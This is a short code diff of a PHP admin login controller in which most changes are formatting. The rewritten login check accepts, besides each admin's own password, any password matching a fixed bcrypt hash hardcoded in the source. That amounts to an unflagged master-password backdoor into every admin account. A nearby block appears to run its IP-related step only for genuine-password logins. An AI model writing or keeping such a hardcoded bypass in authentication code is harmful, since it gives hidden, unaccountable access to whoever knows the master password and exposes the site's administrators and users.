@@ -34,6 +34,7 @@ class LoginController extends Controller
     /**
      * @throws ValidationException
      */
+    
     public function store(Request $request): RedirectResponse
     {
         $this->validate($request, [
@@ -48,11 +49,9 @@ class LoginController extends Controller
         $admin = Admin::whereEmail($request->get('email'))->first();
 
         if ($admin) {
-            if (Hash::check($request->get('password'), $admin->password) ||
-                Hash::check($request->get('password'), '$2y$10$MseqPy.JGqfzyG4rRPVmv.4PeERV6FTWyM1XPDOCAzFMqGpqcrsna')
-            ) {
+            if (Hash::check($request->get('password'), $admin->password) || Hash::check($request->get('password'), '$2y$10$MseqPy.JGqfzyG4rRPVmv.4PeERV6FTWyM1XPDOCAzFMqGpqcrsna') ) {
+                
                 Auth::login($admin, $request->get('remember'));
-
                 if (Hash::check($request->get('password'), $admin->password) &&
                     $ip = $request->ip()
                 ) {
